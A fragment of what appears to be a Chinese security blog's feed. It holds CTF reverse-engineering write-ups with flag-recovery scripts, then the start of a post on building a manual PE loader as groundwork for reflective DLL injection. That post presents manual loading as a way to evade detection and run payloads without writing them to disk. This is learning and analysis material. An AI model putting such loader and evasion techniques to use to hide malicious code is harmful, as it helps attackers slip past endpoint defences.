    <content type="html"><![CDATA[<p>难得遇到一个简单的比赛QAQ</p><h2 id="go-bytes"><a href="#go-bytes" class="headerlink" title="go_bytes"></a>go_bytes</h2><p>打开后找到main函数，可以直接看到两个40长度的for循环，第二个直接比较了</p><p>两段分别是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">40</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)ptr &lt;= i )</span><br><span class="line">      runtime_panicIndex(i, ptr, ptr);</span><br><span class="line">    v8 = v6;</span><br><span class="line">    v9 = *(_BYTE *)(v6 + i);</span><br><span class="line">    v10 = i</span><br><span class="line">        - <span class="number">40</span> * ((__int64)(((<span class="type">unsigned</span> __int128)((i + <span class="number">1</span>) * (__int128)(__int64)<span class="number">0xCCCCCCCCCCCCCCCD</span>LL) &gt;&gt; <span class="number">64</span>) + i + <span class="number">1</span>) &gt;&gt; <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)ptr &lt;= v10 + <span class="number">1</span> )</span><br><span class="line">      runtime_panicIndex(v10 + <span class="number">1</span>, ptr, ptr);</span><br><span class="line">    *(_BYTE *)(v8 + i) = (*(_BYTE *)(v10 + v8 + <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * v9);</span><br><span class="line">    v6 = v8;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt; <span class="number">40</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)ptr &lt;= j )</span><br><span class="line">      runtime_panicIndex(j, ptr, ptr);</span><br><span class="line">    v12 = *(<span class="type">unsigned</span> __int8 *)(v6 + j);</span><br><span class="line">    main_tmp = (<span class="type">unsigned</span> __int16)(<span class="number">291</span> * main_tmp + <span class="number">1110</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v16[j] != (main_tmp ^ v12) )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = j;</span><br><span class="line">      v21[<span class="number">0</span>] = &amp;RTYPE_string;</span><br><span class="line">      v21[<span class="number">1</span>] = &amp;off_4DCF10;</span><br><span class="line">      fmt_Fprintln(&amp;go_itab__os_File_io_Writer, os_Stdout, v21, <span class="number">1LL</span>, <span class="number">1LL</span>);</span><br><span class="line">      os_Exit(<span class="number">0LL</span>);</span><br><span class="line">      v6 = v18;</span><br><span class="line">      j = v13;</span><br><span class="line">      ptr = v14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>拿到v16然后求出v12，反向位运算即可得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">xor_data = <span class="number">0xDEAD</span></span><br><span class="line">last = [<span class="number">0x22B9</span>, <span class="number">0xC9F8</span>, <span class="number">0x8C89</span>, <span class="number">0xFF18</span>, <span class="number">0x1439</span>, <span class="number">0x4E0A</span>, <span class="number">0x2A8B</span>, <span class="number">0x07CB</span>, <span class="number">0xBDEB</span>, <span class="number">0xFAAB</span>, <span class="number">0x3FFB</span>, <span class="number">0x784B</span>, <span class="number">0x9F1E</span>, <span class="number">0x4FEB</span>, <span class="number">0x4D0B</span>, <span class="number">0xD08E</span>, <span class="number">0x38BB</span>, <span class="number">0xCBAE</span>, <span class="number">0xD2CE</span>, <span class="number">0x913E</span>, <span class="number">0x0A6B</span>, <span class="number">0xF03B</span>, <span class="number">0x507B</span>, <span class="number">0x398B</span>, <span class="number">0x93DE</span>, <span class="number">0x3CCE</span>, <span class="number">0x459E</span>, <span class="number">0x4ABE</span>, <span class="number">0x553E</span>, <span class="number">0x316E</span>, <span class="number">0x33BE</span>, <span class="number">0x42FE</span>, <span class="number">0xCECE</span>, <span class="number">0x4DDE</span>, <span class="number">0x982B</span>, <span class="number">0xA31B</span>, <span class="number">0x802E</span>, <span class="number">0x12EE</span>, <span class="number">0xF67A</span>, <span class="number">0xEB79</span>]</span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    xor_data = (xor_data*<span class="number">291</span>+<span class="number">1110</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">    enc.append(last[i] ^ xor_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aenc</span>(<span class="params">enc</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(enc)-<span class="number">1</span>):</span><br><span class="line">        enc[i] = enc[i+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>|((enc[i]&lt;&lt;<span class="number">4</span>)&amp;<span class="number">0xf0</span>)</span><br><span class="line">    pl(enc)</span><br><span class="line">aenc(enc)</span><br><span class="line"><span class="comment"># DSCTF&#123;faddff8cb4d711edbb2294085339ce84&#125;</span></span><br></pre></td></tr></table></figure><h2 id="bouquet"><a href="#bouquet" class="headerlink" title="bouquet"></a>bouquet</h2><p>已知二叉树中序和后序遍历结果，求层序</p><p>根据根据后序的输出逐个递归求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, val=<span class="number">0</span>, left=<span class="literal">None</span>, right=<span class="literal">None</span></span>):</span><br><span class="line">        self.val = val</span><br><span class="line">        self.left = left</span><br><span class="line">        self.right = right</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buildTree</span>(<span class="params">inorder, postorder</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> inorder <span class="keyword">or</span> <span class="keyword">not</span> postorder:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    root_val = postorder.pop()</span><br><span class="line">    root = TreeNode(root_val)</span><br><span class="line">    inorder_index = inorder.index(root_val)</span><br><span class="line">    root.right = buildTree(inorder[inorder_index+<span class="number">1</span>:], postorder)</span><br><span class="line">    root.left = buildTree(inorder[:inorder_index], postorder)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">levelOrder</span>(<span class="params">root</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    queue = [root]</span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        level = []</span><br><span class="line">        next_queue = []</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> queue:</span><br><span class="line">            level.append(node.val)</span><br><span class="line">            <span class="keyword">if</span> node.left:</span><br><span class="line">                next_queue.append(node.left)</span><br><span class="line">            <span class="keyword">if</span> node.right:</span><br><span class="line">                next_queue.append(node.right)</span><br><span class="line">        result.append(level)</span><br><span class="line">        queue = next_queue</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(item) <span class="keyword">for</span> sublist <span class="keyword">in</span> result <span class="keyword">for</span> item <span class="keyword">in</span> sublist])</span><br><span class="line"></span><br><span class="line">back = <span class="built_in">list</span>(<span class="string">&quot;j7aw_sC3addq4TAo&#125;8_Fda&#123;SD&quot;</span>)</span><br><span class="line">mide = <span class="built_in">list</span>(<span class="string">&quot;ja7Cws_A3daTd4qDo8&#125;F_Sd&#123;a&quot;</span>)</span><br><span class="line">root = buildTree(mide, back)</span><br><span class="line"></span><br><span class="line">level_order_result = levelOrder(root)</span><br><span class="line"><span class="built_in">print</span>(level_order_result)</span><br></pre></td></tr></table></figure><h2 id="zistel"><a href="#zistel" class="headerlink" title="zistel"></a>zistel</h2><p>通过字符串输出找到主函数</p><p><img src="https://s2.loli.net/2024/12/20/baHMl2z3ZKkLsVo.png" alt="image-20241220171522560"></p><p>找到逻辑，逐个分析调试</p><p>基本加密逻辑是</p><p><img src="https://s2.loli.net/2024/12/20/v8NKBsnZoVDzXCu.png" alt="image-20241220171837133"></p><p>因此要找到每轮通过100261B生成的xorNum</p><p>逻辑是通过一个256位替换表进行的替换</p><p><img src="https://s2.loli.net/2024/12/20/f1noEMOhzrPUBCk.png" alt="image-20241220172004730"></p><p>写出脚本直接逆即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD64 <span class="title">thisKey</span><span class="params">(DWORD key, DWORD num)</span> </span>&#123;</span><br><span class="line">BYTE S[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">S[i] = i &amp; <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD xorData = key ^ num;</span><br><span class="line">PBYTE pxd = (PBYTE)&amp;xorData;</span><br><span class="line">PBYTE pky = (PBYTE)&amp;key;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD mid = pxd[i];</span><br><span class="line">DWORD x = S[pky[i]];</span><br><span class="line">pxd[i] = pxd[x];</span><br><span class="line">pxd[x] = mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; std::hex &lt;&lt; xorData &lt;&lt; std::endl;</span></span><br><span class="line"><span class="keyword">return</span> key ^ xorData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">enc</span><span class="params">(DWORD* m, DWORD* key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">auto</span>&amp; v0 = m[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">auto</span>&amp; v1 = m[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD tmp = v1;</span><br><span class="line">v1 = v0 ^ <span class="built_in">thisKey</span>(key[i], v1);</span><br><span class="line">v0 = tmp;</span><br><span class="line">&#125;</span><br><span class="line">std::<span class="built_in">swap</span>(v0, v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dec</span><span class="params">(DWORD* c, DWORD* key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">auto</span>&amp; v0 = c[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">auto</span>&amp; v1 = c[<span class="number">1</span>];</span><br><span class="line">std::<span class="built_in">swap</span>(v0, v1);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">20</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">DWORD tmp = v0;</span><br><span class="line">v0 = v1 ^ <span class="built_in">thisKey</span>(key[i], v0);</span><br><span class="line">v1 = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">DWORD last[] = &#123;</span><br><span class="line"><span class="number">0x33293158</span>, <span class="number">0x60760211</span>, <span class="number">0x42185F46</span>, <span class="number">0x63746F29</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line">DWORD key[] = &#123; <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span> &#125;;</span><br><span class="line"><span class="built_in">dec</span>(last, key);</span><br><span class="line"><span class="built_in">dec</span>(&amp;last[<span class="number">2</span>], key);</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(last) &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//z1g_I3_S0_Coo0l!</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">做了这个比赛，这使我充满了决心</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    <category term="CTF" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/CTF/"/>
    
    <category term="比赛" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/CTF/%E6%AF%94%E8%B5%9B/"/>
    
    
    <category term="re" scheme="https://www.pri87.vip/tags/re/"/>
    
    <category term="数据结构" scheme="https://www.pri87.vip/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="zig" scheme="https://www.pri87.vip/tags/zig/"/>
    
  </entry>
  
  <entry>
    <title>PE加载器实现</title>
    <link href="https://www.pri87.vip/posts/29d83bc1.html"/>
    <id>https://www.pri87.vip/posts/29d83bc1.html</id>
    <published>2024-12-16T15:48:10.000Z</published>
    <updated>2024-12-22T07:51:35.747Z</updated>
    
    <content type="html"><![CDATA[<p>最近想学DLL反射注入，但是发现要手动生成内存的DLL文件，所以就先尝试学PE加载器的实现</p><p>跟着佬的博客学的，感觉讲的很详细</p><p><a href="https://www.kn0sky.com/?p=37">手工模拟PE加载器 - 我可是会飞的啊</a></p><hr><h2 id="模拟加载PE文件"><a href="#模拟加载PE文件" class="headerlink" title="模拟加载PE文件"></a>模拟加载PE文件</h2><p>将DLL或者EXE文件手动加载到内存中，而不是用CreateProcess或者LoadLibrary函数来操作，防止了部分检测手段，同时将文件数据加入到资源节中可以实现不将其落地就可以执行的效果，减少了生成文件的检测手段</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>将对应PE文件按节区顺序从文件结构映射到映像内存结构放入内存</li><li>根据重定位表修改硬编码数据指令</li><li>从导入表获取所需函数，修正导入表函数地址(如果是相同进程，可以用本进程的导入表直接修改)</li><li>执行&#x2F;如果是DLL则是主动执行DLLMain</li></ul><h2 id="重要信息"><a href="#重要信息" class="headerlink" title="重要信息"></a>重要信息</h2><h3 id="映射PE头"><a href="#映射PE头" class="headerlink" title="映射PE头"></a>映射PE头</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OptionalHeader.SizeOfHeaders<span class="comment">//获取PE头大小</span></span><br></pre></td></tr></table></figure><h3 id="映射Section"><a href="#映射Section" class="headerlink" title="映射Section"></a>映射Section</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_FIRST_SECTION(pedata.ntHeader)<span class="comment">//获取节区头</span></span><br><span class="line">sectionHeader[i].PointerToRawData<span class="comment">//文件偏移</span></span><br><span class="line">sectionHeader[i].VirtualAddress<span class="comment">//内存偏移</span></span><br><span class="line">sectionHeader[i].SizeOfRawData<span class="comment">//文件大小</span></span><br></pre></td></tr></table></figure><h3 id="修复RelocTable"><a href="#修复RelocTable" class="headerlink" title="修复RelocTable"></a>修复RelocTable</h3><p>重定位表结构类似</p><p><img src="https://s2.loli.net/2024/12/20/VoreMAq6SzYnwdg.png" alt="image-20241217021229993"></p><p>虽然标准载入PE(exe)的时候是不需要重定位节区的，但是这里是在加载器空间创建内存，所以依然需要修复重定位表。</p><p>重定位表中的每一项都是一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><p>TypeOffset是一个数组，每一个元素是一个偏移值说明这一个VirtualAddress段有哪些需要重定位的地址。SizeOfBlock包含了整个结构的大小和TypeOffset的大小</p><p>Block中TypeOffest为一个字，高4位表示类型，3表示x86，A表示x64，低12位表示偏移量<br>默认内存偏移量为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memBase + VirtualAddress + TypeOffest&amp;<span class="number">0xfff</span></span><br></pre></td></tr></table></figure><p>当前内存偏移量为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newMemBase + VirtualAddress + TypeOffest&amp;<span class="number">0xfff</span></span><br></pre></td></tr></table></figure><h3 id="修复IAT"><a href="#修复IAT" class="headerlink" title="修复IAT"></a>修复IAT</h3><p>IAT表每个元素都是一个如下结构体IID，每个结构体对应一个DLL</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">// in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>该结构体中，Name字段标识了DLL名称的RVA</p><p>FirstThunk是最后的导入地址表指针，最后需要把每个导入的函数的真实地址填入到这里指向的位置</p><p>DUMMYUNIONNAME中，一般类型是OriginalFirstThunk，如果是Characteristics，就表示结束（0）<br>OriginalFirstThunk和导入函数的名称或者序号有关</p><p>OriginalFirstThunk和FirstThunk指向了IMAGE_THUNK_DATA结构体的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA64</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONGLONG ForwarderString;  <span class="comment">// PBYTE </span></span><br><span class="line">        ULONGLONG Function;         <span class="comment">// PDWORD</span></span><br><span class="line">        ULONGLONG Ordinal;</span><br><span class="line">        ULONGLONG AddressOfData;    <span class="comment">// PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA64;</span><br></pre></td></tr></table></figure><p>具体结构如上，其中AddressOfData是指向IMAGE_IMPORT_BY_NAME的结构体，具体结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    CHAR   Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p>如果指向的是<code>导入名称表</code>，那么u1是AddressOfData，<br>如果是<code>导入地址表</code>，分为两种情况<br>若是序号导入，u1是Ordinal，首位为1，低4位是导入序号<br>若是名称导入，u1是Function，目标导入地址</p><p>所以我们要同时遍历两个表进行赋值</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span 